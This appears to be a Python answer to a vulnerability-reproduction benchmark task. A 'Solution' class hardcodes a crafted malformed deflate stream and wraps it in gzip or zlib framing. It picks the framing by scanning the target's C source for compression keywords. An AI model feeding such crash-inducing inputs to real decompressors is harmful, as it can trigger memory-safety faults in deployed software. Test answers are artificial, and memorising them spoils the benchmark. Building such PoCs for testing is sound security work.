import os
import re
import tarfile
from typing import Optional


class Solution:
    def __init__(self) -> None:
        self._raw_deflate_poc = bytes([0x05, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        self._gzip_poc = (
            bytes([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF])
            + self._raw_deflate_poc
            + bytes([0x00] * 8)
        )
        self._zlib_poc = bytes([0x78, 0x01]) + self._raw_deflate_poc + bytes([0x00, 0x00, 0x00, 0x01])

    def _infer_wrapper(self, src_path: str) -> str:
        gzip_score = 0
        zlib_score = 0
        raw_score = 0

        def score_text(txt: str) -> None:
            nonlocal gzip_score, zlib_score, raw_score
            t = txt.lower()
            if "gzip" in t or "gunzip" in t or "gz_" in t:
                gzip_score += 3
            if "1f" in t and "8b" in t:
                gzip_score += 2
            if "0x1f" in t and "0x8b" in t:
                gzip_score += 3
            if "id1" in t and "id2" in t and "0x8b" in t:
                gzip_score += 2

            if "zlib" in t:
                zlib_score += 3
            if "adler32" in t or "adler" in t:
                zlib_score += 2
            if "cmf" in t and "flg" in t:
                zlib_score += 1
            if "inflate" in t and "deflate" in t:
                zlib_score += 1
                gzip_score += 1

            if "deflate" in t and ("bitstream" in t or "huffman" in t):
                raw_score += 1

        if not src_path:
            return "gzip"

        try:
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if not fn.endswith((".c", ".h", ".cc", ".cpp")):
                            continue
                        p = os.path.join(root, fn)
                        try:
                            with open(p, "rb") as f:
                                data = f.read(65536)
                        except OSError:
                            continue
                        try:
                            score_text(data.decode("latin1", errors="ignore"))
                        except Exception:
                            pass
            else:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name.lower()
                        if not name.endswith((".c", ".h", ".cc", ".cpp")):
                            continue
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(65536)
                        try:
                            score_text(data.decode("latin1", errors="ignore"))
                        except Exception:
                            pass
        except Exception:
            return "gzip"

        if gzip_score >= max(zlib_score, raw_score) and gzip_score > 0:
            return "gzip"
        if zlib_score > max(gzip_score, raw_score) and zlib_score > 0:
            return "zlib"
        if raw_score > 0:
            return "raw"
        return "gzip"

    def solve(self, src_path: str) -> bytes:
        wrapper = self._infer_wrapper(src_path)
        if wrapper == "zlib":
            return self._zlib_poc
        if wrapper == "raw":
            return self._raw_deflate_poc
        return self._gzip_poc